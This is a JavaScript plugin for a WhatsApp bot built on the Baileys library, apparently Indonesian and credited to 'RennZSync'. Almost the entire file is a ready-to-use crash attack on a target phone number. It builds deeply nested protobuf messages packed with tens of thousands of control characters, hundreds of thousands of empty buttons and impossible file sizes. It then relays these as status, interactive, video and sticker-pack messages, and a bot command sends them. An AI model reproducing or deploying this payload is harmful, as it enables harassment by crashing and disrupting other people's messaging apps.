/* 
by 𝐑𝐞𝐧𝐧𝐙𝐒𝐲𝐧𝐜
𝐋𝐘𝐍𝐍𝐀 𝐀𝐈 
ch: https://whatsapp.com/channel/0029VbCJ0B0K0IBlYlYJ0W3c
dont delete this watermark 
*/
import * as baileys from 'baileys';

const protobuf = global.proto?.proto || global.proto || baileys.proto || baileys.default?.proto;;

const encodeVarint = function(n) {
    var buf = [];
    while (n >= 0x80) {
        buf.push((n & 0x7f) | 0x80);
        n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
};

const wrapLd = function(tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
};

const IMG = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
    directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
    mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
    fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
    fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
    fileLength: 999999999,
    mediaKeyTimestamp: "1785637793",
    mimetype: "image/jpeg",
    height: 9999,
    width: 9999,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgUVJT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z"
};

const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
];

async function RennZSyncCrash(sock, target) {
    if (!protobuf) {
        throw new Error("Proto tidak ditemukan");
    }

    const kontol = {
        documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4",
            mimetype: "application/pdf",
            fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
            fileLength: 999999999,
            pageCount: 9999,
            mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
            fileName: "rennz.pdf",
            fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
            directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
            mediaKeyTimestamp: 1779839963,
            caption: "\u000F".repeat(50000),
            jpegThumbnail: Buffer.from(IMG.jpegThumbnail, 'base64'),
            contextInfo: {
                quotedMessage: {
                    interactiveMessage: {
                        body: { text: "\u001C".repeat(50000) },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 100 }, () => ({}))
                        }
                    }
                }
            }
        }
    };

    const basePayload = protobuf.Message.encode(
        protobuf.Message.fromObject(kontol)
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('JID tidak valid');

    var MAX_BATCH = 3;
    var DELAY_MS = 2000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId = 'rz' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag = TAGS[ti];
            var payload = null;

            for (var depth = 3000; depth >= 1500 && !payload; depth -= 200) {
                try {
                    var decoded = protobuf.Message.decode(inflate(tag, depth));
                    protobuf.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            try {
                await sock.relayMessage('status@broadcast', payload, {
                    messageId: msgId,
                    statusJidList: chunk,
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: chunk.map(function(jid) {
                                return { tag: 'to', attrs: { jid: jid }, content: [] };
                            })
                        }]
                    }]
                });
                totalSent++;
            } catch (e) {
                console.log('Relay error:', e.message);
            }
        }
    }

    await new Promise(r => setTimeout(r, 800));

    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 999999999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "RennZSync - Crash" + "\u0000".repeat(50000),
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [9999987899999999999999, 998999999999999999999, 999899999999999999999, 9998789999999999999999],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "RennZSync - Crash" + "\u000C".repeat(50000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 2000 }, () => ({})),
                        messageParamsJson: "{".repeat(15000),
                        botFeedbackOptions: {
                            botFeedbackKind: 14,
                            botFeedbackKindMultipleNegative: 511,
                            botFeedbackKindMultiplePositive: 1,
                            reportKind: 1
                        }
                    },
                    contextInfo: {
                        quotedMessage: {
                            interactiveMessage: {
                                body: { text: "\u000D".repeat(50000) },
                                nativeFlowMessage: {
                                    buttons: Array.from({ length: 500000 }, () => ({}))
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    try {
        await sock.relayMessage(target, msg1, {});
    } catch (e) {
        console.log('Message 1 error:', e.message);
    }

    await new Promise(r => setTimeout(r, 500));

    try {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    videoMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                        mimetype: "video/mp4",
                        caption: "RennZSync - Crash",
                        fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                        fileLength: "1099511627776",
                        seconds: 172800,
                        mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                        height: 1080,
                        width: 1920,
                        fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                        directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1774428565",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgUVJT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                        annotations: [{
                            polygonVertices: [
                                { x: 0.17499999701976776, y: 0.3379453122615814 },
                                { x: 0.824999988079071, y: 0.3379453122615814 },
                                { x: 0.824999988079071, y: 0.6620468497276306 },
                                { x: 0.17499999701976776, y: 0.6620468497276306 }
                            ],
                            shouldSkipConfirmation: true,
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "2261401457948346",
                                    songId: "849859527815275",
                                    author: "RennZSync" + "ြ".repeat(9000),
                                    title: "ြ".repeat(75000),
                                    artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                    artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                    artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                    artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                    artistAttribution: "https://www.instagram.com/rennzsync",
                                    countryBlocklist: "WEs=",
                                    isExplicit: false
                                }
                            },
                            embeddedAction: true
                        }]
                    }
                }
            }
        }, {});
    } catch (e) {
        console.log('Message 2 error:', e.message);
    }

    await new Promise(r => setTimeout(r, 500));

    try {
        await sock.relayMessage(target, {
            stickerPackMessage: {
                stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                name: "ꦾ".repeat(75000),
                publisher: "RennZSync" + "ꦾ".repeat(5000),
                stickers: [],
                fileLength: "366299919",
                fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
                contextInfo: {
                    remoteJid: "X",
                    participant: "0@s.whatsapp.net",
                    stanzaId: "1234567890ABCDEF",
                    mentionedJid: ["13135555555@s.whatsapp.net"]
                },
                packDescription: "",
                mediaKeyTimestamp: "1747502082",
                trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
                thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
                thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
                thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
                thumbnailHeight: 999999999,
                thumbnailWidth: 9999999999,
                imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
                stickerPackSize: "9990099",
                stickerPackOrigin: "USER_CREATED"
            }
        }, {});
    } catch (e) {
        console.log('Message 3 error:', e.message);
    }
}

async function handler(m, { conn, text, args, usedPrefix, command }) {
    try {
        if (!args[0]) {
            return m.reply('❌ *GAGAL*\n\n> Masukkan nomor target dengan benar!\n> Contoh: *' + usedPrefix + command + ' 6281234567890*');
        }

        let targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';

        await m.reply('⏳ *Mengeksekusi RennZSync Crash ke target...*');
        
        await RennZSyncCrash(conn, targetJid);

        await m.reply('✅ *SUKSES*\n\n> Crash RennZSync berhasil dikirim ke: *' + args[0] + '*');

    } catch (error) {
        console.error('RennZSync Error:', error);
        await m.reply('❌ *GAGAL*\n\n> ' + error.message);
    }
}

handler.help = ['rennzsync'];
handler.tags = ['crash'];
handler.command = /^(rennzsync|rz)$/i;
handler.owner = true;

export default handler;
